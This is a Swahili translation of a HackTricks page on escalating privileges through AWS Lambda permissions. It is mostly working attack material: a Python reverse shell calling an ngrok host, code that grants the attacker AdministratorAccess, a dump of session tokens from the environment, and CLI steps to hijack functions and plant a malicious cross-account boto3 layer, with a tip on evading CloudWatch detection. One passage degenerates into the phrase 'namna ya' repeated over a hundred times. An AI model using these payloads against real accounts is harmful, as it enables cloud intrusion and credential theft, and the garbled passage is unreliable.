# AWS - Ukarabati wa Mamlaka ya Lambda

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## lambda

Maelezo zaidi kuhusu lambda katika:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Watumiaji wenye **ruhusa za `iam:PassRole`, `lambda:CreateFunction`, na `lambda:InvokeFunction`** wanaweza kuongeza mamlaka yao.\
Wanaweza **kuunda kazi mpya ya Lambda na kuiwekea jukumu la IAM lililopo**, ikipatia kazi hiyo ruhusa zinazohusiana na jukumu hilo. Mtumiaji kisha **anaweza kuandika na kupakia nambari kwenye kazi hii ya Lambda (kwa mfano, rev shell)**.\
Baada ya kazi kuwekwa, mtumiaji anaweza **kuchochea utekelezaji wake** na hatua zilizokusudiwa kwa kuita kazi ya Lambda kupitia API ya AWS. Mbinu hii inamruhusu mtumiaji kutekeleza kazi kwa njia isiyo ya moja kwa moja kupitia kazi ya Lambda, ikifanya kazi na kiwango cha ufikiaji ulioidhinishwa na jukumu la IAM lililohusishwa nayo.\\

Mshambuliaji anaweza kutumia hii kupata **rev shell na kuiba token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Unaweza pia **kutumia vibaya ruhusa za jukumu la lambda** kutoka kwa kazi ya lambda yenyewe.\
Ikiwa jukumu la lambda lilikuwa na ruhusa za kutosha unaweza kuitumia kupeana haki za msimamizi kwako:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Pia niwezekana kuvuja kwa siri za jukumu la lambda bila kuhitaji uhusiano wa nje. Hii ingekuwa na manufaa kwa **Lambdas zilizotengwa kwenye Mtandao** zinazotumika kwenye kazi za ndani. Ikiwa kuna vikundi vya usalama visivyojulikana vinavyofuta mabomba yako ya kurudi, kipande hiki cha nambari kitakuruhusu kuvuja moja kwa moja siri kama matokeo ya lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Athari Inayoweza Kutokea:** Privesc moja kwa moja kwa jukumu la huduma ya lambda isiyojulikana iliyotajwa.

{% hint style="danger" %}
Tafadhali kumbuka hata kama inaweza kuonekana kuwa ya kuvutia **`lambda:InvokeAsync`** **haimruhusu kwa pekee** kutekeleza `aws lambda invoke-async`, unahitaji pia `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kama ilivyokuwa kwenye kisa kilichopita, unaweza **kujipatia ruhusa ya `lambda:InvokeFunction`** ikiwa una ruhusa ya **`lambda:AddPermission`**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Athari Inayowezekana:** Privesc moja kwa moja kwa jukumu la huduma ya lambda lililoelezwa.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Watumiaji wenye **ruhusa za `iam:PassRole`, `lambda:CreateFunction`, na `lambda:CreateEventSourceMapping`** (na labda `dynamodb:PutItem` na `dynamodb:CreateTable`) wanaweza **kuinua bila kukusudia** hata bila `lambda:InvokeFunction`.\
Wanaweza kuunda **kazi ya Lambda na nambari inayoweza kudhuru na kuipa jukumu la IAM lililopo**.

Badala ya kuita moja kwa moja Lambda, mtumiaji anaweza kuweka au kutumia meza ya DynamoDB iliyopo, kuilinganisha na Lambda kupitia uwekaji wa chanzo cha tukio. Hii inahakikisha kazi ya Lambda ina **kuzinduliwa moja kwa moja wakati wa kuingia kwa kipengee kipya** kwenye meza, au kwa hatua ya mtumiaji au mchakato mwingine, hivyo kwa njia isiyo ya moja kwa moja kuita kazi ya Lambda na kutekeleza nambari kwa ruhusa za jukumu la IAM lililopitishwa.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ikiwa DynamoDB tayari iko hai katika mazingira ya AWS, mtumiaji anahitaji tu **kuweka upya uhusiano wa chanzo cha tukio** kwa kazi ya Lambda. Hata hivyo, ikiwa DynamoDB haipo katika matumizi, mtumiaji lazima **aunde meza mpya** na uwezeshaji wa utiririshaji:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sasa ni **wezekana kuunganisha kazi ya Lambda kwenye meza ya DynamoDB** kwa **kuunda ramani ya chanzo cha tukio**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Na kazi ya Lambda imeunganishwa na mtiririko wa DynamoDB, mshambuliaji anaweza **kuzindua Lambda kwa njia isiyo ya moja kwa moja kwa kuanzisha mtiririko wa DynamoDB**. Hii inaweza kufanikiwa kwa **kuingiza kipengee** kwenye meza ya DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Madhara Yanayoweza Kutokea:** Privesc moja kwa moja kwa jukumu la huduma ya lambda lililoelezwa.

### `lambda:AddPermission`

Mshambuliaji mwenye ruhusa hii anaweza **kujipatia (au wengine) ruhusa yoyote** (hii inazalisha sera za msingi wa rasilimali kutoa ufikiaji kwa rasilimali):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Athari Inayowezekana:** Privesc moja kwa moja kwa jukumu la huduma ya lambda kwa kutoa ruhusa ya kurekebisha namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Athari Inayowezekana:** Upatikanaji wa habari nyeti.

### `lambda:UpdateFunctionCode`

Watumiaji wanaoshikilia ruhusa ya **`lambda:UpdateFunctionCode`** wana uwezo wa **kurekebisha nambari ya kazi ya Lambda iliyopo ambayo imeunganishwa na jukumu la IAM.**\
Mshambuliaji anaweza **kurekebisha nambari ya lambda ili kuchukua siri za IAM**.

Ingawa mshambuliaji anaweza asikuwe na uwezo wa moja kwa moja kuamsha kazi, ikiwa kazi ya Lambda ipo na inafanya kazi, ni uwezekano kwamba itaanzishwa kupitia mchakato au matukio yaliyopo, hivyo kwa njia isiyo ya moja kwa moja kurahisisha utekelezaji wa nambari iliyorekebishwa.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Athari Inayoweza Kutokea:** Privesc moja kwa moja kwa jukumu la huduma ya lambda inayotumiwa.

### `lambda:UpdateFunctionConfiguration`

#### Utangulizi

[**Tabaka za Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) inaruhusu kuweka **mimbo** katika kazi yako ya lamdba lakini **kuihifadhi kando**, hivyo kificho cha kazi kinaweza kubaki kidogo na **kazi kadhaa zinaweza kushiriki kificho**.

Ndani ya lambda unaweza kuangalia njia ambazo kificho cha python kinapakiwa na kazi kama ifuatavyo:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Hizi ni sehemu:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Kwa mfano, maktaba ya boto3 inapakiwa kutoka `/var/runtime/boto3` (nafasi ya 4).

#### Utekaji

**Kuambatisha safu kwa kazi** inahitaji tu ruhusa ya `lambda:UpdateFunctionConfiguration` na **safu zinaweza kushirikiwa kati ya akaunti**. Pia tungehitaji kujua **maktaba wanazotumia**, ili tuweze kuzibadilisha kwa usahihi, lakini katika mfano huu, tutachukulia tu **kazi iliyoshambuliwa inaingiza boto3**.

Ili kuwa salama, tutatumia Pip kusakinisha toleo sawa la maktaba ya boto3 kutoka kwa wakati wa Lambda tunalolenga (Python 3.7), ili hakuna kitu tofauti kinachoweza kusababisha matatizo katika kazi ya lengo. Wakati huu wa runtime unatumia toleo la boto3 1.9.42.

Kwa msimbo ufuatao, tutasakinisha boto3 toleo la 1.9.42 na mahitaji yake kwa folda ya "lambda\_layer" ya ndani:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Kisha, tutafungua `/lambda_layer/boto3/__init__.py` na kuongeza msimbo wa hatari. Payload tutakayoiweka inaonekana kama hii:

![](<../../../.gitbook/assets/image (26).png>)

`requests` inaagizwa kutoka `botocore`. Kazi itaondoa mazingira ya env, na try-except na 0.1 timeout zipo kuhakikisha msimbo huu haivunji chochote.

{% hint style="info" %}
**Taarifa muhimu:** Usitumie tena `from botocore.vendored import requests` katika vipimo halisi, kwa sababu "DeprecationWarning" itachapishwa kwenye magogo ya CloudWatch ya kazi hiyo, ambayo inaweza kukufanya ukamatwe na mtetezi.
{% endhint %}

Sasa, pakia msimbo huo kwenye **faili ya ZIP** na **uipakie** kwenye **tabaka jipya la Lambda katika akaunti ya MSHAMBULIAJI**. Utahitaji kuunda folda ya "python" kwanza na kuweka maktaba zako humo ili mara tu tunapopakia kwa Lambda, msimbo utapatikana kwenye "/opt/python/boto3". Pia, hakikisha kuwa tabaka hilo ni sawa na Python 3.7 na kwamba **tabaka iko katika eneo sawa na kazi yetu ya lengo**. Mara tu hilo litakapokamilika, tutatumia `lambda:AddLayerVersionPermission` ili **kuifanya tabaka iweze kupatikana hadharani** ili akaunti yetu ya lengo iweze kutumia. Tumia siri zako za AWS binafsi kwa wito huu wa API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Sasa na **vyeti vilivyoharibiwa** tulivyo navyo, tutatekeleza amri ifuatayo kwenye kazi yetu ya Lambda ya lengo "s3-getter", ambayo ita**unganisha safu yetu ya Lambda kati ya akaunti**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Hatua inayofuata itakuwa au **kuamsha kazi** wenyewe ikiwa tunaweza au kusubiri mpaka **iitwe** kwa njia za kawaida - ambayo ni njia salama zaidi.

**Njia ya kisiri zaidi ya kutumia udhaifu huu** inaweza kupatikana katika:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Matokeo Yanayowezekana:** Privesc moja kwa moja kwa jukumu la huduma ya lambda inayotumiwa.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Labda na ruhusa hizo unaweza kuunda kazi na kuitekeleza ikiiita URL... lakini sikuweza kupata njia ya kuita, kwa hivyo niambie ikiwa utafanikiwa!

### Lambda MitM

Baadhi ya lambdas zitakuwa **zinapokea habari nyeti kutoka kwa watumiaji kwa njia ya vigezo.** Ikiwa unapata RCE katika moja wapo, unaweza kuchota habari ambayo watumiaji wengine wanaituma, angalia hii:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Marejeo

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
